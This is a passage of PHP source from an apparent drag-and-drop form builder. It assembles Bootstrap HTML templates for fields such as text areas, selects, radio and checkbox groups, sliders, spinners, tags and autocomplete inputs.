															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';								
								
//////////TEXT AREA
								$output .= '<div class="field form_field common-fields textarea">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn  btn-info btn-sm form-control"><i class=" glyphicon glyphicon-align-justify"></i>&nbsp;&nbsp;<span class="field_title">Text Area</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Text Area</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<textarea name="textarea" id="textarea" placeholder="Text Area"  data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" class="error_message svg_ready the_input_element textarea pre-format form-control" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" title=""></textarea>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';
															$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
						
								
								
//////////SELECT
								$output .= '<div class="field form_field common-fields select">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class=" glyphicon glyphicon-arrow-down"></i>&nbsp;&nbsp;<span class="field_title">Select</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Select</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<select name="select" data-backgound-color="#FFFFFF" data-text-color="#000000" data-input-size="" data-font-family="" data-bold-text="false" data-italic-text="false" data-text-alignment="left" data-border-color="#CCCCCC" data-required="false" class="the_input_element error_message text pre-format form-control" id="select" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-error-class="alert-default"  data-placement="bottom" data-content="Please select an option" title="">
																					<option value="0" selected="selected">--- Select ---</option>
																					<option>Option 1</option>
																					<option>Option 2</option>
																					<option>Option 3</option>
																				</select>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';							
						
//////////MULTI SELECT
								$output .= '<div class="field form_field common-fields multi-select">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class=" glyphicon glyphicon-sort-by-attributes-alt"></i>&nbsp;&nbsp;<span class="field_title">Multi-Select</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Multi Select</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<select name="multi_select[]" multiple data-backgound-color="#FFFFFF" data-text-color="#000000" data-input-size="" data-font-family="" data-bold-text="false" data-italic-text="false" data-text-alignment="left" data-border-color="#CCCCCC" data-required="false" class="the_input_element error_message text pre-format form-control" id="select" data-onfocus-color="#66AFE9" data-error-class="alert-default" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please select an option" title="">
																					<option value="0" selected="selected">--- Select ---</option>
																					<option>Option 1</option>
																					<option>Option 2</option>
																					<option>Option 3</option>
																				</select>
																			';
																	$output .= '</div>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
								
						
//////////RADIO BUTTONS
							$output .= '<div class="field form_field common-fields radio-group">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class=" glyphicon glyphicon-ok-circle"></i>&nbsp;&nbsp;<span class="field_title">Radio Buttons</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Radio Group</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 the-radios input_container error_message" id="the-radios" data-checked-color="" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="Please select one" title="" >';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<label class="radio-inline " for="radios-0"  data-svg="demo-input-1">
																			  <span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-0" value="1" >
																			  <span class="input-label radio-label">Radio 1</span>
																			  </span>
																		  </label>
																		  <label class="radio-inline" for="radios-1"  data-svg="demo-input-1">
																			<span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-1" value="2">
																			  <span class="input-label radio-label">Radio 2</span>
																			</span>
																		  </label>
																		  <label class="radio-inline" for="radios-2"  data-svg="demo-input-1">
																			<span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-2" value="3" >
																			  <span class="input-label radio-label">Radio 3</span>
																			</span>
																		  </label>
																			';
																	
																	$output .= '</div>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
													$output .= '</div>';
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
								

						
//////////CHECK BOXES
							$output .= '<div class="field form_field common-fields check-group">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class=" glyphicon glyphicon-check"></i>&nbsp;&nbsp;<span class="field_title">Check Boxes</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder radio-group no-pre-suffix">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Checbox Group</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 the-radios input_container error_message" id="the-radios" data-checked-color="alert-success" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="Please select one" title="" >';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<label class="checkbox-inline " for="check-1"  data-svg="demo-input-1">
																					  <span class="svg_ready">
																					  <input class="check svg_ready the_input_element" type="checkbox" name="checks[]" id="check-1" value="Check 1" >
																					  <span class="input-label check-label">Check 1</span>
																					  </span>
																				  </label>
																				  <label class="checkbox-inline" for="check-2"  data-svg="demo-input-1">
																					<span class="svg_ready">
																					  <input class="check svg_ready the_input_element" type="checkbox" name="checks[]" id="check-2" value="Check 2">
																					  <span class="input-label check-label">Check 2</span>
																					</span>
																				  </label>
																				  <label class="checkbox-inline" for="check-3"  data-svg="demo-input-1">
																					<span class="svg_ready">
																					  <input class="check svg_ready the_input_element" type="checkbox" name="checks[]" id="check-3" value="Check 3" >
																					  <span class="input-label check-label">Check 3</span>
																					</span>
																				  </label>
																			';
																			$output .= '</div>';	
																	$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											
										$output .= '</div>';	
								$output .= '</div>';

								
							
							
							$output .= '<div class="field form_field uploader-fields single-image-select-group">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="fa fa-image"></i>&nbsp;&nbsp;<span class="field_title">Thumb Select</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">
									';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Radio Group</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 the-radios input_container error_message" id="the-radios" data-checked-color="" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="Please select one" title="" >';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<label class="radio-inline " for="radios-0"  data-svg="demo-input-1">
																			  <span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-0" value="1" >
																			  <span class="input-label radio-label">Radio 1</span>
																			  </span>
																		  </label>
																		  <label class="radio-inline" for="radios-1"  data-svg="demo-input-1">
																			<span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-1" value="2">
																			  <span class="input-label radio-label">Radio 2</span>
																			</span>
																		  </label>
																		 
																			';
																	
																	$output .= '</div>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
													$output .= '</div>';
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
					
//SINGLE IMAGE BUTTONS
							$output .= '<div class="field form_field uploader-fields multi-image-select-group">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="fa fa-image"></i>&nbsp;&nbsp;<span class="field_title">Multi Thumbs</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">
									';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Check Group</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 the-radios input_container error_message" id="the-radios" data-checked-color="" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="Please select one" title="" >';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<label class="radio-inline " for="check-0"  data-svg="demo-input-1">
																			  <span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="checkbox" name="checks" id="check-0" value="1" >
																			  <span class="input-label radio-label">Check 1</span>
																			  </span>
																		  </label>
																		  
																			';
																	
																	$output .= '</div>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
													$output .= '</div>';
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
					
					
					

								
								
//CUSTOM POSTFIX
								$output .= '<div class="field form_field custom-postfix common-fields">';
									$output .= '<div class="draggable_object  input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="glyphicon fa fa-arrow-right"></i>&nbsp;&nbsp;<span class="field_title">Icon After</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Custom field</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="input-group">';
															
															$output .= '<input type="text" class="error_message form-control the_input_element " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" title="" data-secondary-message="" />';
															$output .= '<span class="input-group-addon postfix "><span class="glyphicon"></span></span>';
															$output .= '</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
//CUSTOM PRE-POST
								$output .= '<div class="field form_field custom-pre-postfix common-fields">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="glyphicon fa fa-arrows-h"></i>&nbsp;&nbsp;<span class="field_title">Double Icon</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Custom field</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="input-group date">';
															$output .= '<span class="input-group-addon prefix "><span class="glyphicon"></span></span>';
															$output .= '<input type="text" class="error_message form-control the_input_element " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" title="" data-secondary-message="" />';
															$output .= '<span class="input-group-addon postfix "><span class="glyphicon"></span></span>';
															$output .= '</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
													$output .= '</div>';												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';					
					
							
										
//STAR RATING
								$output .= '<div class="field form_field extended-fields star-rating">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-success btn-sm form-control"><i class=" glyphicon glyphicon-star"></i>&nbsp;&nbsp;<span class="field_title">Star Rating</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Star Rating</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<div id="star" data-total-stars="5" data-enable-half="false" class="error_message svg_ready " style="cursor: pointer;" data-placement="bottom" data-content="Please select a star" title=""></div>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													$output .= '</div>';
												
												
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';		
								
								
								
//SLIDER
								$output .= '<div class="field form_field extended-fields slider">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-success btn-sm form-control"><i class=" glyphicon fa fa-sliders"></i>&nbsp;&nbsp;<span class="field_title">Slider</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Slider</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																$output .= '<div class="error_message slider svg_ready" id="slider" data-fill-color="#f2f2f2" data-min-value="0" data-max-value="100" data-starting-value="0" data-background-color="#ffffff" data-slider-border-color="#CCCCCC" data-handel-border-color="#CCCCCC" data-handel-background-color="#FFFFFF" data-text-color="#000000" data-dragicon="" data-dragicon-class="btn btn-default" data-count-text="{x}"  data-placement="bottom" data-content="Please select a value" title=""></div>';
																	$output .= '<input name="slider" class="hidden the_input_element the_slider" type="text">';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
								
								
								
//SPINNER
								$output .= '<div class="field form_field extended-fields touch_spinner">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-success btn-sm form-control"><i class=" glyphicon glyphicon glyphicon-resize-vertical"></i>&nbsp;&nbsp;<span class="field_title">Spinner</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Spinner</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																$output .= '<input name="spinner" type="text" id="spinner" class="error_message the_spinner svg_ready the_input_element form-control " data-minimum="0" data-maximum="100" data-step="1" data-starting-value="0" data-decimals="0"  data-postfix-icon="" data-prefix-icon="" data-postfix-text="" data-prefix-text="" data-postfix-class="btn-default" data-prefix-class="btn-default" data-down-icon="fa fa-minus" data-up-icon="fa fa-plus" data-down-class="btn-default" data-up-class="btn-default" data-placement="bottom" data-content="Please supply a value" title="" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" />';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
//TAGS
								$output .= '<div class="field form_field extended-fields tags">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-success btn-sm form-control"><i class=" glyphicon glyphicon-tags"></i>&nbsp;&nbsp;<span class="field_title">Tags</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Tags</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																$output .= '<input id="tags" value="" name="tags" type="text" class="tags error_message  the_input_element" data-max-tags="" data-tag-class="label-info" data-tag-icon="fa fa-tag" data-border-color="#CCCCCC" data-background-color="#FFFFFF" data-placement="bottom" data-content="Please enter a value" title="">';
																
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													$output .= '</div>';
												
												
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
								
//AUTO COMPLETE
								$output .= '<div class="field form_field extended-fields autocomplete">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-success btn-sm form-control"><i class="glyphicon glyphicon-th-list"></i>&nbsp;&nbsp;<span class="field_title">Auto complete</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Auto Complete</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																$output .= '<input id="autocomplete" value="" name="autocomplete" type="text" class="error_message svg_ready form-control  the_input_element" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-text-color="#000000" data-border-color="#CCCCCC" data-background-color="#FFFFFF" data-placement="bottom" data-content="Please enter a value" title="">';
																$output .= '<div style="display:none;" class="get_auto_complete_items"></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
								
								
//COLOR PALLET
								$output .= '<div class="field form_field extended-fields color_pallet">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-success btn-sm form-control"><i class="glyphicon glyphicon-th-large"></i>&nbsp;&nbsp;<span class="field_title">Color Palette</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Color Pallet</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
